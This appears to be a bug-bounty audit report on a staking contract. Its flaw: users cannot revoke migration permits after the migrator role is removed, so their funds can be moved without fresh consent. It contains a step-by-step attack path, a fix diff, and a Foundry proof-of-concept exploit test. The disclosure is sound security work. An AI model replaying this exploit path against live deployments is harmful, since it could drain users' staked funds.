# 69926 sc low users cannot revoke migration permits after migrator role is removed enabling fund migration without re consent

**Submitted on Mar 17th 2026 at 12:30:50 UTC by @dmitriia for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69926
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`setMigrationPermit()` enforces `hasRole(MIGRATOR_ROLE, _migrator)` for both granting and revoking permits. Once the admin revokes `MIGRATOR_ROLE` from an address, users who previously granted that address a permit can no longer call `setMigrationPermit(_migrator, false)` because the role check reverts. The stale permit persists in storage. If `MIGRATOR_ROLE` is later re-granted to the same address, all stale permits become active again and migration proceeds without the user's re-consent.

## Vulnerability Details

The migration mechanism requires two independent authorizations:

1. Admin grants `MIGRATOR_ROLE` to a contract address.
2. User calls `setMigrationPermit(migrator, true)` to authorize that address.

When the admin revokes `MIGRATOR_ROLE`, both authorizations should become independently manageable. Instead, the `hasRole` guard in `setMigrationPermit()` blocks all calls — including revocations — creating a one-way lock on the user's permit.

Attack path:

1. Admin grants `MIGRATOR_ROLE` to address `M` for a legitimate V1 → V2 migration window.
2. Alice calls `setMigrationPermit(M, true)` during the window.
3. Migration window closes; admin revokes `MIGRATOR_ROLE` from `M`.
4. Alice attempts `setMigrationPermit(M, false)` → reverts with `MigratorNotFound(M)`.
5. Time passes. Admin re-grants `MIGRATOR_ROLE` to `M` for a new migration cycle.
6. `M` calls `migratePositionsFrom(alice)` — succeeds because the stale permit is still `true`.
7. Alice's unclaimed principal and rewards are transferred to `M` without Alice ever re-consenting.

Root cause is that the `hasRole` check does not distinguish between granting (`true`) and revoking (`false`). I.e. revoking a permit is a user-protective action that is advised to be available unconditionally and it's now not.

As a mitigation consider controlling the role check with the `_isMigrationPermitted` flag:

[Staking.sol#L77-L82](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/src/Staking.sol#L77-L82)

```diff
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
-   if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
+   if (_isMigrationPermitted && !hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);

    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

## Impact Details

Likelihood — Low. Requires the admin to revoke and later re-grant `MIGRATOR_ROLE` to the same address. This is plausible during multi-phase migration rollouts, address reuse, or misconfiguration.

Impact — High. When the path completes, all unclaimed principal and accrued rewards for every user with a stale permit are transferred to the migrator address without any user interaction or additional consent, i.e. the user has no on-chain mechanism to prevent this.

Severity — Low. Low likelihood combined with direct loss of user funds.

## References

`setMigrationPermit()` unconditionally checks `hasRole()`, blocking permit revocation after role removal:

[Staking.sol#L77-L82](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/src/Staking.sol#L77-L82)

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
>>  if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);

    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

`migratePositionsFrom()` reads the stale permit and proceeds to transfer all unclaimed funds:

[Staking.sol#L166-L210](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/src/Staking.sol#L166-L210)

```solidity
function migratePositionsFrom(address user)
    external
    nonReentrant
    onlyRole(MIGRATOR_ROLE)
    returns (UserStake[] memory)
{
>>  if (!migrationPermits[msg.sender][user]) revert MigratorNotPermitted(msg.sender, user);

    UserStake[] memory stakes = userStakes[user];
    // ...
>>  TOKEN.safeTransfer(msg.sender, unclaimedUserAmount + unclaimedUserRewards);
    // ...
}
```

The permit mapping is never cleared by `migratePositionsFrom()` or any other function, so it survives across role grant/revoke cycles:

[Staking.sol#L38](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/src/Staking.sol#L38)

```solidity
>>  mapping(address migrator => mapping(address user => bool isAuthorized)) public migrationPermits;
```

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import {ERC20Permit, ERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {Test, console} from "forge-std/Test.sol";
import {Staking} from "../../src/Staking.sol";
import {IStakingV1} from "../../src/interfaces/IStakingV1.sol";

contract PermitToken is ERC20Permit {
    constructor() ERC20Permit("Token") ERC20("Token", "TKN") {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}

/// @title StalePermit_POC
/// @notice Users cannot revoke migration permits after MIGRATOR_ROLE is revoked,
///         enabling migration without re-consent if the role is later re-granted.
contract StalePermit_POC is Test {
    Staking staking;
    PermitToken token;

    address admin    = makeAddr("admin");
    address manager  = makeAddr("manager");
    address pauser   = makeAddr("pauser");
    address migrator = makeAddr("migrator");
    address alice    = makeAddr("alice");

    bytes32 constant MIGRATOR_ROLE = keccak256("MIGRATOR");

    function setUp() public {
        token   = new PermitToken();
        staking = new Staking(admin, manager, pauser, address(token));

        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, migrator);

        // Fund contract & alice, create period, alice stakes
        token.mint(address(staking), 500 ether);
        token.mint(alice, 100 ether);

        vm.prank(manager);
        staking.addStakingPeriod(1000 ether, 30 days, 7 days, 1000, true);

        vm.startPrank(alice);
        token.approve(address(staking), 100 ether);
        staking.stake(0, 100 ether, IStakingV1.StakeParams({
            maxStakingDurationSeconds: 30 days,
            maxUnlockDurationSeconds:  7 days,
            minAprBps: 1000,
            referrer: address(0)
        }));
        vm.stopPrank();
    }

    /// @notice Core bug: revoke attempt reverts after role removal.
    function test_StalePermit_cannotRevoke() external {
        // Alice grants permit
        vm.prank(alice);
        staking.setMigrationPermit(migrator, true);
        assertTrue(staking.migrationPermits(migrator, alice));

        // Admin revokes MIGRATOR_ROLE
        vm.prank(admin);
        staking.revokeRole(MIGRATOR_ROLE, migrator);

        // Alice tries to revoke permit — reverts
        vm.expectRevert(
            abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migrator)
        );
        vm.prank(alice);
        staking.setMigrationPermit(migrator, false);

        // Stale permit persists
        assertTrue(staking.migrationPermits(migrator, alice));
    }

    /// @notice Full exploit path: stale permit → migration without re-consent.
    function test_StalePermit_exploit() external {
        // 1. Alice permits during legitimate migration window
        vm.prank(alice);
        staking.setMigrationPermit(migrator, true);

        // 2. Admin revokes role (window closed)
        vm.prank(admin);
        staking.revokeRole(MIGRATOR_ROLE, migrator);

        // 3. Alice cannot clean up her permit
        vm.expectRevert(
            abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migrator)
        );
        vm.prank(alice);
        staking.setMigrationPermit(migrator, false);

        // 4. Role re-granted (new migration cycle, or accidental re-grant)
        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, migrator);

        // 5. Stale permit enables migration without Alice's re-consent
        uint256 balBefore = token.balanceOf(migrator);
        vm.prank(migrator);
        IStakingV1.UserStake[] memory migrated = staking.migratePositionsFrom(alice);
        uint256 balAfter = token.balanceOf(migrator);

        assertGt(migrated.length, 0);
        assertGt(balAfter, balBefore);
    }
}
```
